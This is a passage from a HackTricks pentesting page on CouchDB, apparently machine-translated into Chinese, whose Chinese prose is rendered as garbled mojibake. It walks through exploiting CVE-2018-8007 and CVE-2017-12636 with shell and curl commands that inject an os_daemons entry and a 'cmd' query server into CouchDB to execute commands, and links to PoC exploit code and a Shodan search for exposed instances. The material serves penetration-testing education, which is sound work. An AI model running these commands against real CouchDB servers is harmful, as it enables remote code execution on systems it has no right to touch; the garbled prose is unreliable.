<p>åç»­éªŒè¯æ˜¾ç¤ºåœ¨ <code>local.ini</code> ä¸­æ³¨å…¥çš„é…ç½®ï¼Œå¹¶ä¸å¤‡ä»½è¿›è¡Œå¯¹æ¯”ä»¥çªå‡ºå˜åŒ–ï¼š</p>
<pre><code class="language-bash">root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
&lt; [cors]
&lt; origins = 0xdf
&lt; [os_daemons]
&lt; test_daemon = /usr/bin/touch /tmp/0xdf
</code></pre>
<p>æœ€åˆï¼Œé¢„æœŸçš„æ–‡ä»¶ï¼ˆ<code>/tmp/0xdf</code>ï¼‰ä¸å­˜åœ¨ï¼Œè¿™è¡¨æ˜æ³¨å…¥çš„å‘½ä»¤å°šæœªæ‰§è¡Œã€‚è¿›ä¸€æ­¥è°ƒæŸ¥æ˜¾ç¤ºï¼Œä¸CouchDBç›¸å…³çš„è¿›ç¨‹æ­£åœ¨è¿è¡Œï¼Œå…¶ä¸­ä¸€ä¸ªå¯èƒ½ä¼šæ‰§è¡Œæ³¨å…¥çš„å‘½ä»¤ï¼š</p>
<pre><code class="language-bash">root@canape:/home/homer/bin# ps aux | grep couch
</code></pre>
<p>é€šè¿‡ç»ˆæ­¢è¯†åˆ«å‡ºçš„CouchDBè¿›ç¨‹å¹¶å…è®¸ç³»ç»Ÿè‡ªåŠ¨é‡å¯å®ƒï¼Œæ³¨å…¥å‘½ä»¤çš„æ‰§è¡Œè¢«è§¦å‘ï¼Œä¹‹å‰ç¼ºå¤±çš„æ–‡ä»¶çš„å­˜åœ¨è¯å®äº†è¿™ä¸€ç‚¹ï¼š</p>
<pre><code class="language-bash">root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
</code></pre>
<p>æ­¤æ¢ç´¢ç¡®è®¤äº†åœ¨ç‰¹å®šæ¡ä»¶ä¸‹åˆ©ç”¨ CVE-2018-8007 çš„å¯è¡Œæ€§ï¼Œç‰¹åˆ«æ˜¯å¯¹ <code>local.ini</code> æ–‡ä»¶çš„å¯å†™è®¿é—®è¦æ±‚ã€‚æä¾›çš„ä»£ç ç¤ºä¾‹å’Œç¨‹åºæ­¥éª¤ä¸ºåœ¨å—æ§ç¯å¢ƒä¸­å¤åˆ¶è¯¥æ¼æ´æä¾›äº†æ¸…æ™°çš„æŒ‡å—ã€‚</p>
<p>æœ‰å…³ CVE-2018-8007 çš„æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼Œè¯·å‚é˜… mdsec çš„å…¬å‘Šï¼š<a href="https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/">CVE-2018-8007</a>ã€‚</p>
<h3 id="ä½¿ç”¨å¯¹-localini-çš„å†™æƒé™æ¢ç´¢-cve-2017-12636"><a class="header" href="#ä½¿ç”¨å¯¹-localini-çš„å†™æƒé™æ¢ç´¢-cve-2017-12636"><strong>ä½¿ç”¨å¯¹ local.ini çš„å†™æƒé™æ¢ç´¢ CVE-2017-12636</strong></a></h3>
<p>ç¤ºä¾‹ <a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html">æ¥è‡ªè¿™é‡Œ</a>ã€‚</p>
<p>æ¢ç´¢äº†ä¸€ä¸ªè¢«ç§°ä¸º CVE-2017-12636 çš„æ¼æ´ï¼Œè¯¥æ¼æ´é€šè¿‡ CouchDB è¿›ç¨‹å¯ç”¨ä»£ç æ‰§è¡Œï¼Œå°½ç®¡ç‰¹å®šé…ç½®å¯èƒ½ä¼šé˜»æ­¢å…¶åˆ©ç”¨ã€‚å°½ç®¡åœ¨çº¿æœ‰è®¸å¤šæ¦‚å¿µéªŒè¯ (POC) å‚è€ƒï¼Œä½†åœ¨ CouchDB ç‰ˆæœ¬ 2 ä¸Šåˆ©ç”¨è¯¥æ¼æ´éœ€è¦è¿›è¡Œè°ƒæ•´ï¼Œè¿™ä¸å¸¸è§çš„ç›®æ ‡ç‰ˆæœ¬ 1.x ä¸åŒã€‚åˆå§‹æ­¥éª¤åŒ…æ‹¬éªŒè¯ CouchDB ç‰ˆæœ¬å¹¶ç¡®è®¤é¢„æœŸçš„æŸ¥è¯¢æœåŠ¡å™¨è·¯å¾„ä¸å­˜åœ¨ï¼š</p>
<pre><code class="language-bash">curl http://localhost:5984
curl http://0xdf:df@localhost:5984/_config/query_servers/
</code></pre>
<p>ä¸ºäº†é€‚åº”CouchDBç‰ˆæœ¬2.0ï¼Œä½¿ç”¨äº†ä¸€ä¸ªæ–°è·¯å¾„ï¼š</p>
<pre><code class="language-bash">curl 'http://0xdf:df@localhost:5984/_membership'
curl http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers
</code></pre>
<p>å°è¯•æ·»åŠ å’Œè°ƒç”¨æ–°çš„æŸ¥è¯¢æœåŠ¡å™¨æ—¶é‡åˆ°äº†ä¸æƒé™ç›¸å…³çš„é”™è¯¯ï¼Œå¦‚ä»¥ä¸‹è¾“å‡ºæ‰€ç¤ºï¼š</p>
<pre><code class="language-bash">curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig &gt; /tmp/df"'
</code></pre>
<p>è¿›ä¸€æ­¥è°ƒæŸ¥æ˜¾ç¤ºï¼Œ<code>local.ini</code> æ–‡ä»¶å­˜åœ¨æƒé™é—®é¢˜ï¼Œæ— æ³•å†™å…¥ã€‚é€šè¿‡ä½¿ç”¨ root æˆ– homer è®¿é—®ä¿®æ”¹æ–‡ä»¶æƒé™ï¼Œå¯ä»¥ç»§ç»­è¿›è¡Œï¼š</p>
<pre><code class="language-bash">cp /home/homer/etc/local.ini /home/homer/etc/local.ini.b
chmod 666 /home/homer/etc/local.ini
</code></pre>
<p>åç»­å°è¯•æ·»åŠ æŸ¥è¯¢æœåŠ¡å™¨æˆåŠŸï¼Œå“åº”ä¸­æ²¡æœ‰é”™è¯¯æ¶ˆæ¯è¯æ˜äº†è¿™ä¸€ç‚¹ã€‚é€šè¿‡æ–‡ä»¶æ¯”è¾ƒç¡®è®¤äº†å¯¹ <code>local.ini</code> æ–‡ä»¶çš„æˆåŠŸä¿®æ”¹ï¼š</p>
<pre><code class="language-bash">curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/query_servers/cmd' -d '"/sbin/ifconfig &gt; /tmp/df"'
</code></pre>
<p>è¯¥è¿‡ç¨‹ç»§ç»­åˆ›å»ºä¸€ä¸ªæ•°æ®åº“å’Œä¸€ä¸ªæ–‡æ¡£ï¼Œç„¶åå°è¯•é€šè¿‡æ˜ å°„åˆ°æ–°æ·»åŠ çš„æŸ¥è¯¢æœåŠ¡å™¨çš„è‡ªå®šä¹‰è§†å›¾æ‰§è¡Œä»£ç ï¼š</p>
<pre><code class="language-bash">curl -X PUT 'http://0xdf:df@localhost:5984/df'
curl -X PUT 'http://0xdf:df@localhost:5984/df/zero' -d '{"_id": "HTP"}'
curl -X PUT 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"anything": {"map": ""} }, "language": "cmd"}'
</code></pre>
<p>A <a href="https://github.com/carlospolop/hacktricks/pull/116/commits/e505cc2b557610ef5cce09df6a14b10caf8f75a0"><strong>summary</strong></a> with an alternative payload provides further insights into exploiting CVE-2017-12636 under specific conditions. <strong>æœ‰ç”¨çš„èµ„æº</strong> for exploiting this vulnerability include:</p>
<ul>
<li><a href="https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py">POC exploit code</a></li>
<li><a href="https://www.exploit-db.com/exploits/44913/">Exploit Database entry</a></li>
</ul>
<h2 id="shodan"><a class="header" href="#shodan">Shodan</a></h2>
<ul>
<li><code>port:5984 couchdb</code></li>
</ul>
<h2 id="references"><a class="header" href="#references">References</a></h2>
<ul>
<li><a href="https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html">https://bitvijays.github.io/LFF-IPS-P2-VulnerabilityAnalysis.html</a></li>
<li><a href="https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution">https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution</a></li>
</ul>
<p>{% hint style="success" %}
Learn &amp; practice AWS Hacking:<img src="../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks Training AWS Red Team Expert (ARTE)</strong></a><img src="../.gitbook/assets/arte.png" alt="" data-size="line"><br />
Learn &amp; practice GCP Hacking: <img src="../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks Training GCP Red Team Expert (GRTE)</strong><img src="../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>Support HackTricks</summary>
<ul>
<li>Check the <a href="https://github.com/sponsors/carlospolop"><strong>subscription plans</strong></a>!</li>
<li><strong>Join the</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord group</strong></a> or the <a href="https://t.me/peass"><strong>telegram group</strong></a> or <strong>follow</strong> us on <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>Share hacking tricks by submitting PRs to the</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> and <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> github repos.</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../network-services-pentesting/pentesting-vnc.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../network-services-pentesting/5985-5986-pentesting-winrm.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../network-services-pentesting/pentesting-vnc.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../network-services-pentesting/5985-5986-pentesting-winrm.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../elasticlunr.min.js"></script>
        <script src="../mark.min.js"></script>
        <script src="../searcher.js"></script>

        <script src="../clipboard.min.js"></script>
        <script src="../highlight.js"></script>
        <script src="../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
